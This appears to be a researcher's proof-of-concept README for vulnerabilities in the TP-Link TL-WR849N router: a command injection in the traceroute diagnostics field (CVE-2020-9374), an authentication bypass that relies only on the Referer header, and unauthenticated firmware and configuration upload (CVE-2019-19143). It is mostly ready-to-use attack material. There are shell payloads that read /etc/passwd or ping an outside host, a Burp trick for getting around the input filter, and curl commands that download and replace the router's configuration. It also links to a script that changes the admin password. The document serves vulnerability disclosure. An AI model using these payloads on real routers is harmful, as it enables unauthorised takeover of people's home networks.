# [CVE-2020-9374] TP LINK TL-WR849N - REMOTE COMMAND EXECUTION PoC

 ![replace](/src/rce.png)
 
[Poc - RCE-TLWR849N.py](/tp-link/RCE-TLWR849N.py)


## Model 
   0.9.1 4.16 v004c.0 Build 180628 Rel.54314n(4252)

## Download 
  https://www.tp-link.com/br/support/download/tl-wr849n/#Firmware
  
## Vuln
  The vulnerability is present in the Diagnostics area of the router, where it is possible to perform ping and tracerout tests.
## Exploiting
  In the "Tracerout" input we will send the payload to bypass the filter and get the RCE.
  
**Payloads**
 ```Bash
  "$(cat /etc/passwd)"
  "`cat /etc/passwd`"
  ;`ping host.com`
 ```
 
 #### If the page has a filter that doesn't allow special characters, we can circumvent it with Burp.
 ![replace](/src/replace.png)

Math/replace > Response Body

Math: window.location.href="http://192.168.21.1";

Replace: alert('injected');

# Auth Bypass: Firmware and Configs update

## Vuln
The application ignore authentication headers, and checked only "Referer: http://ip.router/", 
if the user is coming with this header, he would certainly be authenticated on the platform

## Exploiting

`curl -X GET http://192.168.0.1/cgi/conf.bin`


Response: `HTTP/1.1 403 Forbidden`

`curl -X GET -H "Referer: http://192.168.0.1/mainFrame.htm" http://192.168.0.1/cgi/conf.bin`

Response: `HTTP/1.1 200 OK`

[Poc - Change admin password](/tp-link/tp-link_painel_pass_change.py)

# [CVE-2019-19143] Firmware Update: Uploading new firmware without access to the panel

## Model
TP-LINK TL-WR849N 0.9.1 4.16
![replace firmware](https://i.imgur.com/oedwA0w.png)

## Vuln

The auth bypass vulnerability has been fixed in some versions, but the firmware bypass is present in the latest versions.

## Exploit
Updating the firmware and injecting a new configuration file into the router.

```bash
curl -i -X POST -H "Content-Type: multipart/form-data" -H "Referer: http://192.168.0.2/mainFrame.htm" -F data=@conf.bin http://192.168.0.2/cgi/confup

```


